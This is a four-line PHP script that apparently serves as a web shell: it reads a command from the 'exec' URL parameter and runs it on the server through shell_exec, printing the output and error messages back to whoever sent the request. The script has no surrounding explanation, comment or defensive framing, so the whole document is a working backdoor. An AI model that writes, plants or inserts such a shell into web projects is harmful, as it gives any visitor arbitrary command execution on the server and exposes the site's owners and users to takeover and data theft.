<?php
if(isset($_GET['exec'])){
    echo shell_exec($_GET['exec']." 2>&1");
}
